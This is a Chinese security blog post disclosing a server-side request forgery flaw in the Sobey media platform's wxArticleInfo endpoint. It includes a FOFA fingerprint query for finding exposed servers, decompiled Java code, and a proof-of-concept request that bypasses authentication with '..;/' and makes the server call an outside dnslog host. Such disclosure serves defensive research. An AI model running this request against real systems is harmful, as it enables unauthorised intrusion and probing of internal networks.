---
title: "索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/wxArticleInfo SSRF漏洞"
source: https://mrxn.net/jswz/sobey-WXArticleInt-wxArticleInfo-SSRF.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchwxarticleintwxarticleinfo-ssrf漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/wxArticleInfo SSRF漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/29 11:30
* 626浏览
* [0评论](#comment)
* 25分钟阅读

深入探索

代理服务器

软件

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝融媒体是一套面向新闻传媒行业的内容生产与发布平台，主要用于稿件采编、融媒协同管理以及多渠道分发。该系统的 **/sobey-mchEditor/mch/WXArticleInt/wxArticleInfo** 接口在处理外部请求参数时缺乏严格的地址校验与访问控制，导致存在服务器端请求伪造（[SSRF](https://mrxn.net/tag/SSRF)）漏洞。攻击者可通过该漏洞诱导服务器发起任意 HTTP/HTTPS 请求，从而探测内网服务结构、访问受限接口，甚至在特定条件下实现对内网应用的数据窃取或进一步利用。

漏洞修复方案

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

深入探索

网络安全课程

代码安全审计

Web安全书籍

根据漏洞信息看下`mch/WXArticleInt/wxArticleInfo`的实现逻辑

[![索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/wxArticleInfo SSRF漏洞](images/img-001-4f01b953460c.webp)](https://image.mrxn.net/ab262e5d4577472d9b7afa9886740bed.webp)

直接进入看它的实现逻辑如下

计算机服务器

深入探索

数据库

授权

服务器

```
@RequestMapping(
    value = {"/wxArticleInfo"},
    method = {RequestMethod.GET}
)
public Response wxArticleInfo(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("wxurl") String wxurl) {
    Response response;
    try {
        Map<String, String> wxDoc = parseWXDoc(wxurl);
        if (wxDoc != null) {
            response = Response.success(wxDoc);
        } else {
            response = Response.failed("解析公众号文章失败");
        }
    } catch (Exception e) {
        e.printStackTrace();
        response = Response.failed("解析公众号文章失败");
    }

    return response;
}
```

参数**wxurl**被带入`parseWXDoc`方法，跟进查看其实现逻辑

漏洞修复方案

```
private static Map<String, String> parseWXDoc(String requestUrl) {
    try {
        logger.info("开始请求微信公众号文章的url:" + requestUrl);
        String proxyIpPort = SystemConfigUtil.getSolarSystemByCache("proxyIpPort", "");
        String proxyType = SystemConfigUtil.getSolarSystemByCache("proxyType", "HTTP");
        String reverseProxyPrefix = SystemConfigUtil.getReverseProxyPrefix();
        Proxy proxy = null;
        if (StringUtils.isNotEmpty(proxyIpPort)) {
            String[] split = proxyIpPort.split(":");
            if ("SOCKS".equalsIgnoreCase(proxyType)) {
                proxy = new Proxy(Type.SOCKS, new InetSocketAddress(split[0], Integer.valueOf(split[1])));
            } else {
                proxy = new Proxy(Type.HTTP, new InetSocketAddress(split[0], Integer.valueOf(split[1])));
            }
        } else if (!StringUtils.isEmpty(reverseProxyPrefix)) {
            requestUrl = StringUtil.dealReverseProxyUrl(requestUrl, reverseProxyPrefix);
        }

        Connection connect = Jsoup.connect(requestUrl);
        if (proxy != null) {
            connect.proxy(proxy);
        }
```

requestUrl被直接使用Jsoup.connect进行访问，整个过程中对**wxurl无任何过滤或校验，因此造成[SSRF漏洞](https://mrxn.net/tag/SSRF)。**

# 漏洞复现

> 权限绕过相关分析可以参考之前的 [索贝融媒体 getList SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html) 的权限校验部分

```
GET /sobey-mchEditor/js/..;/mch/WXArticleInt/wxArticleInfo?siteCode=&token=&wxurl=http://xxe.dnslog.pt/xxe_test HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/wxArticleInfo SSRF漏洞](images/img-002-863c0b4235ad.webp)](https://image.mrxn.net/5a791cd0ada445a5a6b7b4682c81815c.webp)

成功在DNSLOG平台收到DNS和HTTP请求

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#SSRF](https://mrxn.net/tag/SSRF)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/wxArticleInfo SSRF漏洞](https://mrxn.net/jswz/sobey-WXArticleInt-wxArticleInfo-SSRF.html)  
文章链接：<https://mrxn.net/jswz/sobey-WXArticleInt-wxArticleInfo-SSRF.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-WXArticleInt-wxArticleInfo-SSRF.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALaklEQVR4Aeyb7VbjOhJFs+/7vzND5cw2UtmKA/Qi+WFWi+PzUWWhcm7Szcx/t9vt4yfrY/F11quXrfI9J1/lR91sRzNd73yVe1Y39xOsgXzWXX/e5QS2gXw+Jbdn1rMbt5f5zrvefeAG+9Vz8hEhdd4DvsdXdd4D0g+C5juaP8OxbhvIKF7XrzuB3UAgU4cZV1uEOefTANF7HUSHoD7M3D76nasfoVmYe/YszD6EW7/Kr/yel0P6woz6I+4GMprX9d+fwD8byLNPjTkR8tTIPQKYdQjXNw/RAa1TtLajhcD9/WvF1UX7yH+D/2wgv9nEVft1Ar8eiE8HzE+V+tetvndlPaRv5xB97ArRIGjNmDm6hjnf6zq3x0rX/wn+eiA/uelVsz6B3UCcesd1iwPnU4I8dZ+Xh39g9uGYuw+YffUjPLzhp2j28/L+B9Kz63dz+AZzDsKHyMNL+3c8KtoN5Ch0aX93AttAIFOHx9i3Bsk7fZj5WV7f+s7huX6ApacI3D9FeU8ItxDC9dVXCMl3H6LDYxzrtoGM4nX9uhP4z6fgu+iWresc8lTowzG37qdo/8LeA3JPdQivbC045j2/4uodq/dP1/UK6af5Yr4cCOTpgaD7hHAIrnSfEJhz5vXlMOfgOQ7JwRfas99jxSG1vW6VNyf2nHpHyH0g2P3iy4GUea2/P4H/YJ4WhDt10a3JRUi++3Jxle++OfWO+mL3i688mPda2aMFyUHQDBxziA4zWif2fUHy+oXXK6RO4Y3W9ikLMq2zKUJyq58BZt9+MOsQrt/7df3j4+P+G01zMNebL4R4ZsXyakF8CJZWy9wKK3O0zHdPHXIfuWge4gO36xVye6+v04H0KcpXP8ZvfcjTYn/7wbFu7hmE9LCnCLO+6gXJ6cPMuw6zDzM37z4KTwdi0YV/cwK7T1n9tjBPFWa+ysOcq+nXMl/XteQw52Hmla0F0SFo/YiVqwVzprRaZiF+abXUxdLGpQ6pk5uB6HKx5+QipA643kNub/a1fcpympBpuU/1FT/TIf1gRusgutz7iepwnNMvhGQgeNajampB8nVdq9eVVqvrKw5zv6qtBbMOM6/M9R5Sp/BGazkQyPQg6NMA4Wc/g/kVwnN9IDn7eF+ILi80I0Iy8sqMa6VD6iBoDTzm5uwLycu7Lx9xOZAxdF3/3QmcfspyujBPG8JXW4XZh3AI2lfsfWDOwczNQ3RA6f7bQPjim/H/C+CeudPhG0R3T+IQuV+qi3dx+AZzn8E6vbxeIadH9LeB7VNWv63Th0xbH8L1uy7vvnpHmPvBzM/y3S/uvcXSHq2eg+zBGgjvOf0VQuog2HP2G/F6hfRTejHf3kMgU3RafV/qIiS/yqlDctad6foipF4uQnT7Fnav88qMC9IDgubNyEVIDoJnur7Y+8Lcp3LXK6RO4Y3WNhCnB5kaBPteIbr57sshObnY62DOdV++Qkg94C02BA4/TW2BxQWkDoLeexHf5J6Ti5B+EDzSt4FsXa+Ll57ANhCYp+au+hRXXN26jpD+EDQvQvRed8atL4T0qOta1tZ1LYivLpY3rq5D6sZMXfec/Ayrtpa5unZtA9G88LUnsPt7CORpcFtwzJ2oORGS1xf1RUgOguod4bHf88VhroGZV+ZowZyDmVsDx7r+7XY7vOxnAfs+1yvk8OheJ24DcXod3dpK1+8ImT4E9Xufzs3BXKf+DPaenfce8LN7QepgxlV/mHPua8xvAxnF6/p1J/D0QGCeLhzz/qMcPQVjBtJn1Op6VQfJwx6rrhbEq+taEA7B0mp5D7G0cX1XH2vrGp67HyQHXL9Tv73Z1/YKga8pwde1+/Vp6bjy1SG9rINwCPYcRIegfkf7HaFZeNwDZt9evf5Z3VzH3g9yXwjqF24DKXKt15/A9q+9TvVsS7CfatXArNtPrMzR0l/hUc2oQe4LjPL92p538vmt80/p/ge4/5sXBM2JEB2CXb83Gb5BcoN0v7ROvIvt2/UKaQfyanoN5NUTaPffDWR8ObXsna58dcjLFY7RnAjHufvNnvhmn8Ieh/Qur5Y+HOv6IhznILq5jnWvWl2Hx3WV3w2kxGu97gS2f1yETA+CfUsQHWbsOXk9IbVWHNJn5auvEFIPe7Sm7l9L3hFSW5la3S+tFiTX/c4hOZjRXPWqteKlX6+QOoU3WtvH3r6nmuR3FuSpsMZ+cojfdbnY8ytufkSzIuSeEDSrL8Lsm4Po5kR9seudm4P0gxn1C69XSJ3CG63lQCBT7HuF6BDU96mAWYdwffMw6xCuv0JIzn4jQryzWkgOgvawDmYdwiG4ylsv9pxcNDficiBj6Lr+uxPYPmX1WzpFyFOhry5CfAiq97wcnsvZB+a8eu8H3P9v0+XDXGO2vFqdQ/Lqz2L1qrXKw+O+VVtrrL9eIeNpvMH1NpCa1Ljcmxpk2hDUF83JITmY8ePj4/4kQ/Se73zV15x+oVrH8mrBfE9z5R2t7stXaA+Y79N1mP2x3zaQUbyuX3cC299DIFODYN+SUxYhuc6tUxfVO0L6dH1Vpw77OthrY19r1SB5mFFfhPir+lWu582pQ/qqF16vkDqFN1rLT1nuETJFmLFPuXPrV2heXw65j7oIj3XA6P09qvoB9188aUB4eePS7whzHsJ7Tm5PSA6C+iLMunWF1yvEU3oT3N5Dajrjgkxx1MZrmP3+80D8lQ7HvveA+BDseu9b3ExdjwvSQw1m3usgftd7vb6o3zk87mdd4fUKqVN4o7V7D4FMs+8RokOw+3KfDvFM138W7Ss+W3eUg8c/S6/xniKkHoLmIdycqC+qQ/LA9T+Uu73Z1/YeApmS++vTk3eEuQ5mbj+IDkH76IvwnA/JWVcIe6307y73BukHx2hf8yuuDu